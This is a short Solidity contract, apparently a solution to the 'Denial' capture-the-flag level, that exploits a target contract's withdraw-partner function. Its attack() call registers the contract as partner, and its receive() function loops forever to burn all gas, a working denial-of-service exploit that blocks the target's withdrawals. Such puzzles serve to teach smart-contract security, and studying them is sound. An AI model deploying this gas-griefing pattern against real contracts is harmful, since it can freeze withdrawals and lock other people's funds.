// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract DenialAttack {
    IDenial targetContract;
    uint256 public testValue = 0;

    constructor(address _targetAddress) {
        targetContract = IDenial(_targetAddress);
    }

    function attack() public {
        targetContract.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // To consume gas indefinitely!
        while (true) {
            testValue++;
        }
    }
}
